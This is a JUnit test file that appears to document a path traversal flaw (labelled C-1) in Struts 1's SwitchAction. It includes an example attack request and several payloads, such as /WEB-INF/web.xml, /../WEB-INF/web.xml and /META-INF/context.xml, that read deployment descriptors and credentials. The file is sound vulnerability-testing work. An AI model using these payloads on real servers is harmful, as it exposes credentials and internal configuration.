/*
 * Copyright 2026 The Struts1-Forever Project.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.struts.actions;

import junit.framework.TestCase;

import org.apache.struts.Globals;
import org.apache.struts.action.ActionForward;
import org.apache.struts.action.ActionMapping;
import org.apache.struts.config.ModuleConfig;
import org.apache.struts.config.impl.ModuleConfigImpl;
import org.apache.struts.mock.MockActionServlet;
import org.apache.struts.mock.MockHttpServletRequest;
import org.apache.struts.mock.MockHttpServletResponse;
import org.apache.struts.mock.MockHttpSession;
import org.apache.struts.mock.MockServletConfig;
import org.apache.struts.mock.MockServletContext;

/**
 * Demonstrates that SwitchAction's {@code page} parameter is passed through
 * to {@link ActionForward} without any validation, enabling path traversal.
 *
 * <h3>Vulnerability: C-1 (Path Traversal in SwitchAction)</h3>
 *
 * <p>SwitchAction reads the {@code page} and {@code prefix} parameters
 * directly from the HTTP request and constructs
 * {@code new ActionForward(page)} with no sanitization.
 * The returned ActionForward is eventually passed to
 * {@code RequestProcessor.processForwardConfig()}, which calls
 * {@code getServletContext().getRequestDispatcher(uri).forward(req, res)}.
 * This allows an attacker to read arbitrary server-side resources such as
 * {@code /WEB-INF/web.xml}.</p>
 *
 * <h3>Attack scenario</h3>
 * <pre>
 *   GET /app/switch.do?prefix=&amp;page=/WEB-INF/web.xml HTTP/1.1
 * </pre>
 * <p>The response body will contain the contents of {@code /WEB-INF/web.xml},
 * exposing database credentials, security constraints, and internal mappings.</p>
 */
public class TestSwitchActionPathTraversal extends TestCase {

    private MockServletContext servletContext;
    private MockHttpServletRequest request;
    private MockHttpServletResponse response;
    private SwitchAction action;
    private ActionMapping mapping;

    protected void setUp() throws Exception {
        super.setUp();

        servletContext = new MockServletContext();

        // Register a default module (prefix = "") so that
        // ModuleUtils.selectModule("", request, context) succeeds.
        ModuleConfig defaultModule = new ModuleConfigImpl("");
        servletContext.setAttribute(Globals.MODULE_KEY + "", defaultModule);
        servletContext.setAttribute(
                Globals.MODULE_PREFIXES_KEY, new String[0]);

        MockServletConfig servletConfig = new MockServletConfig();
        MockActionServlet servlet =
                new MockActionServlet(servletContext, servletConfig);

        action = new SwitchAction();
        action.setServlet(servlet);

        mapping = new ActionMapping();

        MockHttpSession session = new MockHttpSession();
        request = new MockHttpServletRequest(session);
        response = new MockHttpServletResponse();
    }

    // ----------------------------------------------------------
    // Proof-of-concept: path traversal payloads pass through
    // to ActionForward.getPath() with no validation.
    // ----------------------------------------------------------

    /**
     * An attacker sends {@code page=/WEB-INF/web.xml&prefix=}
     * to read the deployment descriptor.
     */
    public void testPathTraversal_WEB_INF() throws Exception {
        request.addParameter("prefix", "");
        request.addParameter("page", "/WEB-INF/web.xml");

        ActionForward forward = action.execute(mapping, null, request, response);

        assertNotNull("ActionForward should not be null", forward);
        assertEquals(
                "The raw page parameter is used as the forward path "
                + "without any validation -- path traversal is possible",
                "/WEB-INF/web.xml",
                forward.getPath());
        assertFalse("Forward should not be a redirect", forward.getRedirect());
    }

    /**
     * An attacker sends {@code page=/../WEB-INF/web.xml&prefix=}
     * using a parent-directory sequence.
     */
    public void testPathTraversal_DotDot() throws Exception {
        request.addParameter("prefix", "");
        request.addParameter("page", "/../WEB-INF/web.xml");

        ActionForward forward = action.execute(mapping, null, request, response);

        assertNotNull(forward);
        assertEquals(
                "Parent-directory traversal sequence passes through unfiltered",
                "/../WEB-INF/web.xml",
                forward.getPath());
    }

    /**
     * An attacker sends {@code page=/META-INF/context.xml&prefix=}
     * to read the Tomcat context configuration.
     */
    public void testPathTraversal_META_INF() throws Exception {
        request.addParameter("prefix", "");
        request.addParameter("page", "/META-INF/context.xml");

        ActionForward forward = action.execute(mapping, null, request, response);

        assertNotNull(forward);
        assertEquals(
                "/META-INF/context.xml passes through unfiltered",
                "/META-INF/context.xml",
                forward.getPath());
    }

    /**
     * An attacker uses a path that does not start with '/' to bypass
     * module-prefix prepending in processForwardConfig.
     *
     * <p>In {@code RequestProcessor.processForwardConfig()}, paths not
     * starting with '/' are passed through as-is without prepending the
     * module prefix. This is another variant of the attack.</p>
     */
    public void testPathTraversal_RelativePath() throws Exception {
        request.addParameter("prefix", "");
        request.addParameter("page", "../WEB-INF/web.xml");

        ActionForward forward = action.execute(mapping, null, request, response);

        assertNotNull(forward);
        assertEquals(
                "Relative path traversal passes through unfiltered",
                "../WEB-INF/web.xml",
                forward.getPath());
        // In processForwardConfig(), this path does NOT start with '/'
        // so it is passed directly to doForward() without module prefix.
    }

    /**
     * An attacker can also use the page parameter for open redirect by
     * combining it with an absolute URL when redirect=true is somehow set.
     * Even without redirect, the forward path is fully attacker-controlled.
     */
    public void testArbitraryPathIsAccepted() throws Exception {
        request.addParameter("prefix", "");
        request.addParameter("page", "/any/arbitrary/path.jsp");

        ActionForward forward = action.execute(mapping, null, request, response);

        assertNotNull(forward);
        assertEquals("/any/arbitrary/path.jsp", forward.getPath());
    }

    // ----------------------------------------------------------
    // Verify that prefix validation exists (but page has none)
    // ----------------------------------------------------------

    /**
     * Verify that an invalid prefix causes a ServletException.
     * This is the ONLY validation SwitchAction performs -- and it is
     * on the prefix parameter, NOT on the page parameter.
     */
    public void testInvalidPrefix_ThrowsServletException() {
        request.addParameter("prefix", "/nonexistent");
        request.addParameter("page", "/index.jsp");

        try {
            action.execute(mapping, null, request, response);
            fail("Should have thrown an exception for invalid prefix");
        } catch (Exception e) {
            // Expected -- invalid prefix is rejected.
            // But note: page="/WEB-INF/web.xml" with a VALID prefix
            // would have succeeded.
        }
    }

    /**
     * Verify that missing parameters cause a ServletException.
     */
    public void testMissingParameters_ThrowsServletException() {
        // No page or prefix parameter set
        try {
            action.execute(mapping, null, request, response);
            fail("Should have thrown an exception for missing parameters");
        } catch (Exception e) {
            // Expected
        }
    }
}
